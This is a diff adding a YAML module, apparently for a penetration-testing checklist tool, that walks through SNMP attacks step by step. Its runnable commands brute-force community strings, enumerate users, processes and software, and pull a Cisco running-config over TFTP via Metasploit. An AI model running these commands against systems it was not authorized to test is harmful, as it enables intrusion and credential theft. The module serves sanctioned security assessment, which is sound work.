@@ -1,0 +1,99 @@
+module: snmp
+name: SNMP (161 / 162 UDP)
+inputs: [OUT]
+
+sections:
+
+  - id: initial
+    name: Initial Access & Detection
+    steps:
+      - id: version
+        text: Confirm live / detect version (UDP)
+        commands: |
+          nmap -sU -p161 -sV $IP
+          nmap -sU -p161 --script=snmp-info $IP
+      - id: reachable
+        text: Quick reachability with default community
+        commands: |
+          snmpget -v2c -c public $IP 1.3.6.1.2.1.1.1.0
+
+  - id: community
+    name: Community String Discovery
+    authorized: true
+    steps:
+      - id: onesixtyone
+        text: Brute community strings
+        commands: |
+          onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
+          hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -v $IP snmp
+      - id: nmap_brute
+        text: NSE community brute
+        commands: |
+          nmap -sU -p161 --script=snmp-brute $IP
+
+  - id: enum
+    name: Enumeration (walk the MIB)
+    steps:
+      - id: walk
+        text: Full walk (v1 / v2c)
+        commands: |
+          snmpwalk -v2c -c public $IP
+          snmpbulkwalk -v2c -c public $IP
+          snmpwalk -v1 -c public $IP
+      - id: snmp_check
+        text: Structured dump (snmp-check)
+        commands: |
+          snmp-check $IP -c public
+      - id: targeted
+        text: High-value OIDs (users / processes / software / ports)
+        commands: |
+          snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25   # Windows users
+          snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # running processes
+          snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2  # installed software
+          snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3    # listening TCP ports
+      - id: nse_scripts
+        text: NSE enumeration scripts
+        commands: |
+          nmap -sU -p161 --script "snmp-netstat,snmp-processes,snmp-win32-users,snmp-win32-services,snmp-win32-software" $IP
+
+  - id: loot
+    name: Credential / Config Extraction
+    steps:
+      - id: creds
+        text: Hunt community strings / creds / SNMPv3 users in output
+        manual: true
+        commands: |
+          # grep walked output for 'password','community','string'
+          # extended objects (1.3.6.1.4.1.9.9.171 etc) may leak configs
+      - id: cisco_config
+        text: Grab Cisco running-config via SNMP RW + TFTP
+        manual: true
+        commands: |
+          # if RW community found: snmp-config copy running-config to your TFTP
+          msfconsole -qx "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS $IP; run; exit"
+
+  - id: write
+    name: Write Access (RW community)
+    authorized: true
+    steps:
+      - id: rw_test
+        text: Test for a read-write community
+        manual: true
+        commands: |
+          snmpset -v2c -c private $IP 1.3.6.1.2.1.1.5.0 s test
+
+  - id: exploit
+    name: Exploitation
+    authorized: true
+    steps:
+      - id: walk
+        text: "Community strings + walk"
+        commands: |
+          onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
+          snmpwalk -v2c -c public $IP
+          snmp-check $IP
+      - id: extract
+        text: "Extract users / processes / installed software"
+        commands: |
+          snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25    # users
+          snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2   # processes
